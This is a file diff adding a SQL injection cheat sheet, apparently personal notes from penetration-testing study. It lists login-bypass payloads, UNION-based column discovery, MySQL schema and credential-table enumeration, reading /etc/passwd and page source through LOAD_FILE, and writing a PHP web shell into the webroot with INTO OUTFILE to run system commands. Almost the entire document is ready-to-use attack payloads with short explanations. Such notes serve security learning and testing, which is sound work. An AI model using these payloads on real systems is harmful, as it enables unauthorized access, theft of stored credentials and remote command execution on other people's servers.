@@ -1,0 +1,114 @@
+QUERY LOGIC
+
+-> Insert into username:
+
+admin' or '1'='1
+BECAUSE (AND gets evaluated first): 
+SELECT * FROM logins WHERE username='admin' or '1'='1' AND password = 'blah';
+
+-> Insert into password:
+
+notAdmin' or '1'='1
+BECAUSE:
+SELECT * FROM logins WHERE username='notAdmin' or '1'='1' AND password = 'blah' or '1'='1';
+
+-------------------------------------------------------------------------------------------
+
+USING COMMENTS
+
+-> Insert into username:
+
+admin'--   (with a space after the last dash !!!)
+BECAUSE:
+SELECT * FROM logins WHERE username='admin'-- ' AND password = 'something';
+
+admin')--  
+BECAUSE:
+SELECT * FROM logins where (username='admin')
+
+-> Login as user with specific id:
+
+user' or id=5)--  
+BECAUSE:
+SELECT * FROM logins WHERE username='user' OR id = 5-- ' AND password = 'something';
+
+-------------------------------------------------------------------------------------------
+
+UNION INJECTION
+
+-> Detect number of columns
+' order by 1--   
+
+-> Sort by the second column
+' order by 2--  
+
+-> Find the number of columns [An error indcates there're no more columns]
+' UNION select 1,2,3--   
+
+-> Get the database verion
+' UNION select 1,@@version,3,4-- 
+
+-> Get the current user of the database
+' UNION select 1,user(),3,4--   
+
+-------------------------------------------------------------------------------------------
+
+DATABASE ENUMERATION (MySQL)
+
+-> Get available databases (schema)
+' UNION select 1,schema_name,3,4 from INFORMATION_SCHEMA.SCHEMATA-- 
+
+-> Get current database
+' UNION select 1,database(),2,3-- 
+
+-> Get table names of specific database ('dev')
+' UNION select 1,TABLE_NAME,TABLE_SCHEMA,4 from INFORMATION_SCHEMA.TABLES where table_schema='dev'-- 
+
+-> Get column names ('credentials', was seen in the output of the above command)
+' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.COLUMNS where table_name='credentials'-- 
+
+-> Get the Data of the table 'dev'
+' UNION select 1, username, password, 4 from dev.credentials-- 
+
+-------------------------------------------------------------------------------------------
+
+READING FILES
+
+-> Find out, as which user we have access to the database
+' UNION SELECT 1, user(), 3, 4-- 
+OR:
+' UNION SELECT 1, user, 3, 4 from mysql.user-- 
+
+-> Check for superadmin (DBA) privileges (Y = Yes)
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user-- 
+OR specify a user:
+' UNION SELECT 1, super_priv, 3, 4 FROM mysql.user WHERE user="root"-- 
+
+-> Check the current user privileges
+' UNION SELECT 1, grantee, privilege_type, is_grantable FROM information_schema.user_privileges-- 
+
+-------------------------------------------------------------------------------------------
+
+LOAD FILE
+
+-> Read /etc/passwd:
+' UNION SELECT 1, LOAD_FILE("/etc/passwd"), 3, 4-- 
+
+-> Read source of current page (if the browser renders the php, Ctrl+U):
+' UNION SELECT 1, LOAD_FILE("/var/www/html/search.php"), 3, 4-- 
+
+------------------------------------------------------------------------------------------- 
+
+WRITING FILES
+
+-> Get the 'secure_file_priv' variable to find out if it is set or not:
+' UNION SELECT 1, variable_name, variable_value, 4 FROM information_schema.global_variables where variable_name="secure_file_priv"-- 
+
+-> Write to file:
+' union select 1,'file written successfully!',3,4 into outfile '/var/www/html/proof.txt'-- 
+
+-> Writing a webshell to webroot (shell.php):
+' union select "",'<?php system($_REQUEST[0]); ?>', "", "" into outfile '/var/www/html/shell.php'-- 
+
+==> IP/shell?0=id
+
